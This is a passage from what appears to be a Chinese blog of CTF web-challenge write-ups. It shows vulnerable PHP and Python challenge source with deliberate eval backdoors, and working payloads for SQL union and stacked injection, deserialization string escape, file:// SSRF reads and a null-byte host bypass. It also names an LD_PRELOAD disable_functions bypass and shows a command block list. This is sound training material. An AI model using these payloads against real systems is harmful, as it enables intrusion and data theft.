class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>) </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;op === <span class=\"hljs-string\">&quot;2&quot;</span>)<br>            <span class=\"hljs-keyword\">$this</span>-&gt;op = <span class=\"hljs-string\">&quot;1&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;content = <span class=\"hljs-string\">&quot;&quot;</span>;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">new</span> FileHandler;<br>var_dump(urlencode(serialize(<span class=\"hljs-variable\">$a</span>)));<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"gxyctf2019babysqli\"><a class=\"markdownIt-Anchor\" href=\"#gxyctf2019babysqli\">#</a> [GXYCTF2019]BabySQli</h2>\n<ol>\n<li>测试单引号会报错</li>\n<li>union select 字段数为 3，但是没有回显点，可能是盲注或者报错注入</li>\n<li>user 为 admin 时报 wrong pass，user 为其它时报 wrong user，这里可能是盲注点</li>\n<li>有一段编码，base32+base64 解码得到： <code>select * from user where username = '$name'</code></li>\n<li>题目过滤了一些字符： <code>(    )   or    =</code></li>\n<li>要通过注入拿到数据基本是不可行的，这里看到 sql 语句中只有查询 name 值，没有看到 password，可能判断是否登入的语句是 <code>(select * from user where username = '$name')['password'] =md5(password) </code></li>\n<li>此时构造 payload: <code>name=-1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456</code>  即可登陆成功拿到 flag</li>\n</ol>\n<h2 id=\"0ctf-2016piapiapia\"><a class=\"markdownIt-Anchor\" href=\"#0ctf-2016piapiapia\">#</a> [0CTF 2016]piapiapia</h2>\n<ol>\n<li>/www.zip 拿到源码</li>\n<li>看源码应该是反序列化的题目，同时看到 <code>return preg_replace($safe, 'hacker', $string);</code> ，应该是字符逃逸反序列化的题目。同时 flag 应该在 config.php 中</li>\n<li>先构造 POP 链</li>\n<li>profile.php 可以读文件，要实现任意文件读取就要覆盖<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mi>r</mi><mi>o</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>p</mi><mi>h</mi><mi>o</mi><mi>t</mi><msup><mi>o</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>，而</mtext></mrow><annotation encoding=\"application/x-tex\">profile[&#x27;photo&#x27;]，而</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mord\"><span class=\"mord mathnormal\">o</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">而</span></span></span></span> profile [‘photo’] 在 update.php 中控制。接下来就是要如何把 $profile [‘photo’] 变成 config.php</li>\n<li>update.php 可传入四个参数，其中 phone 和 email 被正则匹配限制，而 nickname 是用 strlen 限制在 10 以内，把 nickname 改成数组也就绕过了长度限制</li>\n<li>我们需要构造 <code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:9:&quot;lalalalla&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> ，利用 where 会被替换成 hacker，构造 payload： <code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></li>\n<li>要注意这边构造时，需要把 nickname 构造成数组</li>\n</ol>\n<h2 id=\"gxyctf2019禁止套娃\"><a class=\"markdownIt-Anchor\" href=\"#gxyctf2019禁止套娃\">#</a> [GXYCTF2019] 禁止套娃</h2>\n<ol>\n<li>\n<p>测试发现有 /.git/ 用 githack 跑一下，但是我没拿到源码？？</p>\n</li>\n<li>\n<p>网上找到源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&quot;flag.php&quot;</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;flag在哪里呢？ &lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>]))&#123;<br>    <span class=\"hljs-keyword\">if</span> (!preg_match(<span class=\"hljs-string\">&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-string\">&#x27;;&#x27;</span> === preg_replace(<span class=\"hljs-string\">&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;</span>, <span class=\"hljs-literal\">NULL</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>            <span class=\"hljs-keyword\">if</span> (!preg_match(<span class=\"hljs-string\">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>])) &#123;<br>                <span class=\"hljs-comment\">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class=\"hljs-keyword\">else</span>&#123;<br>        <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class=\"hljs-comment\">// highlight_file(__FILE__);</span><br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>无参数 RCE（<a href=\"https://xz.aliyun.com/t/6316%EF%BC%89\">https://xz.aliyun.com/t/6316）</a></p>\n</li>\n<li>\n<p>一些常见函数：</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">getchwd</span><span class=\"hljs-params\">()</span></span> 函数返回当前工作目录。<br><span class=\"hljs-function\"><span class=\"hljs-title\">scandir</span><span class=\"hljs-params\">()</span></span> 函数返回指定目录中的文件和目录的数组。<br><span class=\"hljs-function\"><span class=\"hljs-title\">dirname</span><span class=\"hljs-params\">()</span></span> 函数返回路径中的目录部分。<br><span class=\"hljs-function\"><span class=\"hljs-title\">chdir</span><span class=\"hljs-params\">()</span></span> 函数改变当前的目录。<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">readfile</span><span class=\"hljs-params\">()</span></span>  输出一个文件<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">current</span><span class=\"hljs-params\">()</span></span>       返回数组中的当前单元, 默认取第一个值<br><span class=\"hljs-function\"><span class=\"hljs-title\">pos</span><span class=\"hljs-params\">()</span></span>           current() 的别名<br><span class=\"hljs-function\"><span class=\"hljs-title\">next</span><span class=\"hljs-params\">()</span></span> 函数将内部指针指向数组中的下一个元素，并输出。<br><span class=\"hljs-function\"><span class=\"hljs-title\">end</span><span class=\"hljs-params\">()</span></span>       将内部指针指向数组中的最后一个元素，并输出。<br><span class=\"hljs-function\"><span class=\"hljs-title\">array_rand</span><span class=\"hljs-params\">()</span></span>    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。<br><span class=\"hljs-function\"><span class=\"hljs-title\">array_flip</span><span class=\"hljs-params\">()</span></span>    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">chr</span><span class=\"hljs-params\">()</span></span> 函数从指定的 ASCII 值返回字符。<br>hex2bin — 转换十六进制字符串为二进制字符串<br><br><span class=\"hljs-function\"><span class=\"hljs-title\">getenv</span><span class=\"hljs-params\">()</span></span>        获取一个环境变量的值(在<span class=\"hljs-number\">7.1</span>之后可以不给予参数)<br></code></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"gyctf2020blacklist\"><a class=\"markdownIt-Anchor\" href=\"#gyctf2020blacklist\">#</a> [GYCTF2020]Blacklist</h2>\n<ol>\n<li>\n<p>preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i&quot;,$inject);</p>\n</li>\n<li>\n<p>第一眼看题目像强网杯随便注，同样测试堆叠注入</p>\n</li>\n<li>\n<p><code>1';show tables;</code> =&gt;</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-function\"><span class=\"hljs-title\">array</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span> &#123;<br>  <span class=\"hljs-selector-attr\">[0]</span>=&gt;<br>  string(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">&quot;FlagHere&quot;</span><br>&#125;<br><span class=\"hljs-function\"><span class=\"hljs-title\">array</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span> &#123;<br>  <span class=\"hljs-selector-attr\">[0]</span>=&gt;<br>  string(<span class=\"hljs-number\">5</span>) <span class=\"hljs-string\">&quot;words&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p><code>1';show columns from FlagHere;</code> =&gt;</p>\n<figure class=\"highlight sml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sml\"><span class=\"hljs-built_in\">array</span>(<span class=\"hljs-number\">6</span>) &#123;<br>  [<span class=\"hljs-number\">0</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">4</span>) <span class=\"hljs-string\">&quot;flag&quot;</span><br>  [<span class=\"hljs-number\">1</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">12</span>) <span class=\"hljs-string\">&quot;varchar(100)&quot;</span><br>  [<span class=\"hljs-number\">2</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">2</span>) <span class=\"hljs-string\">&quot;NO&quot;</span><br>  [<span class=\"hljs-number\">3</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">0</span>) <span class=\"hljs-string\">&quot;&quot;</span><br>  [<span class=\"hljs-number\">4</span>]=&gt;<br>  <span class=\"hljs-type\">NULL</span><br>  [<span class=\"hljs-number\">5</span>]=&gt;<br>  <span class=\"hljs-built_in\">string</span>(<span class=\"hljs-number\">0</span>) <span class=\"hljs-string\">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>HANDLER … OPEN 语句打开一个表，使其可以使用后续 HANDLER … READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER … CLOSE 或会话终止之前不会关闭</p>\n<p><code>1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;</code></p>\n</li>\n</ol>\n<h2 id=\"suctf-2019pythonginx\"><a class=\"markdownIt-Anchor\" href=\"#suctf-2019pythonginx\">#</a> [SUCTF 2019]Pythonginx</h2>\n<ol>\n<li>\n<p>源码：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">def getUrl():<br>    url = request.args.<span class=\"hljs-built_in\">get</span>(<span class=\"hljs-string\">&quot;url&quot;</span>)<br>    host = parse.<span class=\"hljs-built_in\">urlparse</span>(url).hostname<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return <span class=\"hljs-string\">&quot;我扌 your problem? 111&quot;</span><br>    parts = <span class=\"hljs-built_in\">list</span>(<span class=\"hljs-built_in\">urlsplit</span>(url))<br>    host = parts[<span class=\"hljs-number\">1</span>]<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return <span class=\"hljs-string\">&quot;我扌 your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;.&#x27;</span>):<br>        newhost.<span class=\"hljs-built_in\">append</span>(h.<span class=\"hljs-built_in\">encode</span>(<span class=\"hljs-string\">&#x27;idna&#x27;</span>).<span class=\"hljs-built_in\">decode</span>(<span class=\"hljs-string\">&#x27;utf-8&#x27;</span>))<br>    parts[<span class=\"hljs-number\">1</span>] = <span class=\"hljs-string\">&#x27;.&#x27;</span>.<span class=\"hljs-built_in\">join</span>(newhost)<br>    #去掉 url 中的空格<br>    finalUrl = <span class=\"hljs-built_in\">urlunsplit</span>(parts).<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27; &#x27;</span>)[<span class=\"hljs-number\">0</span>]<br>    host = parse.<span class=\"hljs-built_in\">urlparse</span>(finalUrl).hostname<br>    if host == <span class=\"hljs-string\">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class=\"hljs-built_in\">urlopen</span>(finalUrl, timeout=<span class=\"hljs-number\">2</span>).<span class=\"hljs-built_in\">read</span>()<br>    else:<br>        return <span class=\"hljs-string\">&quot;我扌 your problem? 333&quot;</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>第一层，当 <code>//</code>  没有正确引入时 hostname 就无法正确匹配到，也就是说我们只要 <code>////</code>  即可绕过第一层</p>\n</li>\n<li>\n<p>第二、三层和第一层一样，也绕过了</p>\n</li>\n<li>\n<p>Nginx 重要文件位置</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><br>配置文件存放目录：<span class=\"hljs-regexp\">/etc/</span>nginx<br>主配置文件：<span class=\"hljs-regexp\">/etc/</span>nginx<span class=\"hljs-regexp\">/conf/</span>nginx.conf<br>管理脚本：<span class=\"hljs-regexp\">/usr/</span>lib64<span class=\"hljs-regexp\">/systemd/</span>system/nginx.service<br>模块：<span class=\"hljs-regexp\">/usr/</span>lisb64<span class=\"hljs-regexp\">/nginx/m</span>odules<br>应用程序：<span class=\"hljs-regexp\">/usr/</span>sbin/nginx<br>程序默认存放位置：<span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/nginx/</span>html<br>日志默认存放位置：<span class=\"hljs-regexp\">/var/</span>log/nginx<br>配置文件目录为：<span class=\"hljs-regexp\">/usr/</span>local<span class=\"hljs-regexp\">/nginx/</span>conf/nginx.conf<br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>/usr/local/nginx/conf/nginx.conf 读到 flag 位置 file:////suctf.cc/usr/fffffflag 拿到 flag</p>\n</li>\n<li>\n<p>据说预期解是 <code>file://suctf.c℆sr/fffffflag</code> (<a href=\"https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session\">https://zhuanlan.zhihu.com/p/104885386?utm_source=wechat_session</a>)</p>\n</li>\n</ol>\n<h2 id=\"gkctf2020checkin\"><a class=\"markdownIt-Anchor\" href=\"#gkctf2020checkin\">#</a> [GKCTF2020]CheckIN</h2>\n<ol>\n<li>\n<p>源码：</p>\n<figure class=\"highlight php-template\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php-template\"><span class=\"xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Check_In<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span></span><br><span class=\"xml\"></span><span class=\"php\"><span class=\"hljs-meta\">&lt;?php</span> </span><br><span class=\"php\">highlight_file(<span class=\"hljs-keyword\">__FILE__</span>);</span><br><span class=\"php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">ClassName</span></span></span><br><span class=\"hljs-class\"><span class=\"php\"></span>&#123;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$code</span> = <span class=\"hljs-literal\">null</span>;</span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$decode</span> = <span class=\"hljs-literal\">null</span>;</span><br><span class=\"php\">        <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span></span><br><span class=\"hljs-function\"><span class=\"php\">        </span>&#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">$this</span>-&gt;code = @<span class=\"hljs-keyword\">$this</span>-&gt;x()[<span class=\"hljs-string\">&#x27;Ginkgo&#x27;</span>];</span><br><span class=\"php\">                <span class=\"hljs-keyword\">$this</span>-&gt;decode = @base64_decode( <span class=\"hljs-keyword\">$this</span>-&gt;code );</span><br><span class=\"php\">                @<span class=\"hljs-keyword\">Eval</span>(<span class=\"hljs-keyword\">$this</span>-&gt;decode);</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\"></span><br><span class=\"php\">        <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">x</span>(<span class=\"hljs-params\"></span>)</span></span><br><span class=\"hljs-function\"><span class=\"php\">        </span>&#123;</span><br><span class=\"php\">                <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$_REQUEST</span>;</span><br><span class=\"php\">        &#125;</span><br><span class=\"php\">&#125;</span><br><span class=\"php\"><span class=\"hljs-keyword\">new</span> ClassName();</span><br></code></pre></td></tr></table></figure>\n</li>\n<li>\n<p>给了 shell，先看一下 phpinfo，发现有 disable_functions，应该是饶 disable_functions 的题目， <code>/var/tmp/</code>  可以写文件，参考 LD_PRELOAD 的 without send_mail 方法绕过，利用 /readflag 命令拿到 flag</p>\n</li>\n</ol>\n<h2 id=\"gkctf2020cve版签到\"><a class=\"markdownIt-Anchor\" href=\"#gkctf2020cve版签到\">#</a> [GKCTF2020] cve 版签到</h2>\n<ol>\n<li>提示 cve-2020-7066，也就是可以 %00 截断</li>\n<li>header 里有 hint 提示 flag 在 localhost</li>\n<li>访问？url=127.0.0.1%00.ctfhub.com 拿到提示 host 要以 123 结尾</li>\n<li>访问？url=127.0.0.123%00.ctfhub.com 拿到 flag</li>\n</ol>\n<h2 id=\"安洵杯-2019easy_web\"><a class=\"markdownIt-Anchor\" href=\"#安洵杯-2019easy_web\">#</a> [安洵杯 2019] easy_web</h2>\n<ol>\n<li>\n<p>url 中的 img 经过 2 次 base64 解码 + 1 次 ASCII Hex 解码得到 555.png，于是把 555.png 改成 index.php 读到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class=\"hljs-string\">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>];<br><span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>]) || !<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;cmd&#x27;</span>])) <br>    header(<span class=\"hljs-string\">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class=\"hljs-variable\">$file</span> = hex2bin(base64_decode(base64_decode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;img&#x27;</span>])));<br><br><span class=\"hljs-variable\">$file</span> = preg_replace(<span class=\"hljs-string\">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class=\"hljs-string\">&quot;&quot;</span>, <span class=\"hljs-variable\">$file</span>);<br><span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&quot;/flag/i&quot;</span>, <span class=\"hljs-variable\">$file</span>)) &#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-variable\">$txt</span> = base64_encode(file_get_contents(<span class=\"hljs-variable\">$file</span>));<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class=\"hljs-variable\">$txt</span> . <span class=\"hljs-string\">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$cmd</span>;<br><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br><span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;</span>, <span class=\"hljs-variable\">$cmd</span>)) &#123;<br>    <span class=\"hljs-keyword\">echo</span>(<span class=\"hljs-string\">&quot;forbid ~&quot;</span>);<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-keyword\">if</span> ((<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>] !== (<span class=\"hljs-keyword\">string</span>)<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;a&#x27;</span>]) === md5(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">&#x27;b&#x27;</span>])) &#123;<br>        <span class=\"hljs-keyword\">echo</span> `<span class=\"hljs-variable\">$cmd</span>`;<br>    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>        <span class=\"hljs-keyword\">echo</span> (<span class=\"hljs-string\">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span 